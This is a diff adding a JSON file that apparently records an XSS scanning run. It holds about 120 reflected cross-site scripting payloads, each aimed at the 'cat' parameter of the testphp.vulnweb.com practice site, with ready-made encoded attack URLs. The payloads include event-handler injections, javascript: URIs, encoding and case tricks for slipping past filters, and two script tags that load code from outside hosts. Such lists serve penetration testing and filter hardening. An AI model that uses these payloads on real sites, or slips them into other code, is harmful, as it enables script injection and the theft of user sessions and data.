@@ -1,0 +1,704 @@
+[
+  {
+    "param": "cat",
+    "payload": "<svg onload=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg+onload%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"><svg onload=alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Csvg+onload%3Dalert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"onmouseover=alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22onmouseover%3Dalert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"autofocus/onfocus=alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22autofocus%2Fonfocus%3Dalert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "'-alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27-alert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\\'-alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%5C%27-alert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "</script><svg onload=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3C%2Fscript%3E%3Csvg+onload%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable onblur=alert(1)>lose focus!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+onblur%3Dalert%281%29%3Elose+focus%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onclick=alert(1)>click this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onclick%3Dalert%281%29%3Eclick+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x oncopy=alert(1)>copy this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+oncopy%3Dalert%281%29%3Ecopy+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x oncontextmenu=alert(1)>right click this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+oncontextmenu%3Dalert%281%29%3Eright+click+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x oncut=alert(1)>copy this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+oncut%3Dalert%281%29%3Ecopy+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x ondblclick=alert(1)>double click this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+ondblclick%3Dalert%281%29%3Edouble+click+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x ondrag=alert(1)>drag this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+ondrag%3Dalert%281%29%3Edrag+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable onfocus=alert(1)>focus this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+onfocus%3Dalert%281%29%3Efocus+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable oninput=alert(1)>input here!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+oninput%3Dalert%281%29%3Einput+here%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable onkeydown=alert(1)>press any key!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+onkeydown%3Dalert%281%29%3Epress+any+key%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable onkeypress=alert(1)>press any key!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+onkeypress%3Dalert%281%29%3Epress+any+key%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable onkeyup=alert(1)>press any key!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+onkeyup%3Dalert%281%29%3Epress+any+key%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onmousedown=alert(1)>click this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onmousedown%3Dalert%281%29%3Eclick+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onmousemove=alert(1)>hover this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onmousemove%3Dalert%281%29%3Ehover+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onmouseout=alert(1)>hover this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onmouseout%3Dalert%281%29%3Ehover+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onmouseover=alert(1)>hover this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onmouseover%3Dalert%281%29%3Ehover+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onmouseup=alert(1)>click this!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onmouseup%3Dalert%281%29%3Eclick+this%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x contenteditable onpaste=alert(1)>paste here!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+contenteditable+onpaste%3Dalert%281%29%3Epaste+here%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script>alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script>alert(1)<!\u2013",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3C%21%E2%80%93",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script src=//brutelogic.com.br/1.js>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript+src%3D%2F%2Fbrutelogic.com.br%2F1.js%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script src=//3334957647/1>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript+src%3D%2F%2F3334957647%2F1%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "%3Cx onxxx=alert(1)",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%253Cx+onxxx%3Dalert%281%29",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<%78 onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3C%2578+onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x %6Fnxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+%256Fnxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x o%6Exxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+o%256Exxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x on%78xx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+on%2578xx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onxxx%3D1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onxxx%253D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<X onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3CX+onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x OnXxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+OnXxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<X OnXxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3CX+OnXxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onxxx=1 onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onxxx%3D1+onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x/onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx%2Fonxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x%09onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx%2509onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x%0Aonxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx%250Aonxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x%0Conxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx%250Conxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x%0Donxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx%250Donxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x%2Fonxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx%252Fonxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x 1='1'onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+1%3D%271%27onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x 1=\"1\"onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+1%3D%221%22onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x </onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+%3C%2Fonxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x 1=\">\" onxxx=1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+1%3D%22%3E%22+onxxx%3D1",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<http://onxxx%3D1/",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Chttp%3A%2F%2Fonxxx%253D1%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<x onxxx=alert(1) 1='",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cx+onxxx%3Dalert%281%29+1%3D%27",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "*/alert(1)</script><script>/*",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%2A%2Falert%281%29%3C%2Fscript%3E%3Cscript%3E%2F%2A",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "*/alert(1)\">'onload=\"/*<svg/1='",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%2A%2Falert%281%29%22%3E%27onload%3D%22%2F%2A%3Csvg%2F1%3D%27",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "*/</script>'>alert(1)/*<script/1='",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%2A%2F%3C%2Fscript%3E%27%3Ealert%281%29%2F%2A%3Cscript%2F1%3D%27",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script>alert(1)</script>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script src=javascript:alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript+src%3Djavascript%3Aalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<iframe src=javascript:alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<embed src=javascript:alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cembed+src%3Djavascript%3Aalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<a href=javascript:alert(1)>click",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Ca+href%3Djavascript%3Aalert%281%29%3Eclick",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<math><brute href=javascript:alert(1)>click",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cmath%3E%3Cbrute+href%3Djavascript%3Aalert%281%29%3Eclick",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form action=javascript:alert(1)><input type=submit>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform+action%3Djavascript%3Aalert%281%29%3E%3Cinput+type%3Dsubmit%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<isindex action=javascript:alert(1) type=submit value=click>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cisindex+action%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form><button formaction=javascript:alert(1)>click",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform%3E%3Cbutton+formaction%3Djavascript%3Aalert%281%29%3Eclick",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form><input formaction=javascript:alert(1) type=submit value=click>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform%3E%3Cinput+formaction%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form><input formaction=javascript:alert(1) type=image value=click>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform%3E%3Cinput+formaction%3Djavascript%3Aalert%281%29+type%3Dimage+value%3Dclick%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form><input formaction=javascript:alert(1) type=image src=SOURCE>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform%3E%3Cinput+formaction%3Djavascript%3Aalert%281%29+type%3Dimage+src%3DSOURCE%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<isindex formaction=javascript:alert(1) type=submit value=click>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cisindex+formaction%3Djavascript%3Aalert%281%29+type%3Dsubmit+value%3Dclick%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<object data=javascript:alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cobject+data%3Djavascript%3Aalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe+srcdoc%3D%3Csvg%2Fo%26%23x6Eload%26equals%3Balert%26lpar%3B1%29%26gt%3B%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<svg><script xlink:href=data:,alert(1) />",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%3E%3Cscript+xlink%3Ahref%3Ddata%3A%2Calert%281%29+%2F%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<math><brute xlink:href=javascript:alert(1)>click",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cmath%3E%3Cbrute+xlink%3Ahref%3Djavascript%3Aalert%281%29%3Eclick",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<html ontouchstart=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Chtml+ontouchstart%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<html ontouchend=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Chtml+ontouchend%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<html ontouchmove=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Chtml+ontouchmove%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<html ontouchcancel=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Chtml+ontouchcancel%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onorientationchange=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onorientationchange%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"><img src=1 onerror=alert(1)>.gif",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E.gif",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22+onload%3D%22alert%28document.domain%29%22%2F%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script src=\"data:&comma;alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript+src%3D%22data%3A%26comma%3Balert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"><script src=data:&comma;alert(1)//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cscript+src%3Ddata%3A%26comma%3Balert%281%29%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<base href=//0>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbase+href%3D%2F%2F0%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<script/src=\"data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%2Fsrc%3D%22data%3A%26comma%3Beval%28atob%28location.hash.slice%281%29%29%29%2F%2F%23alert%281%29",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onload=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onload%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onpageshow=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onpageshow%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onfocus=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onfocus%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onhashchange=alert(1)><a href=#x>click this!#x",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onhashchange%3Dalert%281%29%3E%3Ca+href%3D%23x%3Eclick+this%21%23x",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+style%3Doverflow%3Aauto%3Bheight%3A1000px+onscroll%3Dalert%281%29+id%3Dx%3E%23x",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onscroll=alert(1)><br><br><br><br>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onscroll%3Dalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<br><br><br><br><br><br><br><br><br><br>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<br><br><br><br><br><br><x id=x>#x",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cx+id%3Dx%3E%23x",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onresize=alert(1)>press F12!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onresize%3Dalert%281%29%3Epress+F12%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<body onhelp=alert(1)>press F1! (MSIE)",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onhelp%3Dalert%281%29%3Epress+F1%21+%28MSIE%29",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<marquee onstart=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cmarquee+onstart%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<marquee loop=1 width=0 onfinish=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cmarquee+loop%3D1+width%3D0+onfinish%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<audio src onloadstart=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Caudio+src+onloadstart%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<video onloadstart=alert(1)><source>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cvideo+onloadstart%3Dalert%281%29%3E%3Csource%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<input autofocus onblur=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cinput+autofocus+onblur%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<keygen autofocus onfocus=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Ckeygen+autofocus+onfocus%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form onsubmit=alert(1)><input type=submit>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform+onsubmit%3Dalert%281%29%3E%3Cinput+type%3Dsubmit%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<select onchange=alert(1)><option>1<option>2",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cselect+onchange%3Dalert%281%29%3E%3Coption%3E1%3Coption%3E2",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<menu id=x contextmenu=x onshow=alert(1)>right click me!",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cmenu+id%3Dx+contextmenu%3Dx+onshow%3Dalert%281%29%3Eright+click+me%21",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<Img Src=javascript:alert(1) OnError=location=src>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3CImg+Src%3Djavascript%3Aalert%281%29+OnError%3Dlocation%3Dsrc%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<svg/onload=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%2Fonload%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "\"><body onload=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Cbody+onload%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "';alert(1);//",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27%3Balert%281%29%3B%2F%2F",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<iframe src='javascript:alert(1)'></iframe>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<math><mtext></mtext><script>alert(1)</script></math>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cmath%3E%3Cmtext%3E%3C%2Fmtext%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fmath%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<img src=x onerror=confirm(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onerror%3Dconfirm%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<details open ontoggle=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cdetails+open+ontoggle%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<video><source onerror=\"alert(1)\"></video>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cvideo%3E%3Csource+onerror%3D%22alert%281%29%22%3E%3C%2Fvideo%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<object data='javascript:alert(1)'>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cobject+data%3D%27javascript%3Aalert%281%29%27%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<a href='javascript:alert(1)'>click</a>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Ca+href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C%2Fa%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<img src=x onmouseover=alert(1)>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onmouseover%3Dalert%281%29%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E",
+    "context": "html/js"
+  },
+  {
+    "param": "cat",
+    "payload": "<form><button formaction='javascript:alert(1)'>click</button></form>",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Cform%3E%3Cbutton+formaction%3D%27javascript%3Aalert%281%29%27%3Eclick%3C%2Fbutton%3E%3C%2Fform%3E",
+    "context": "html/js"
+  }
+]
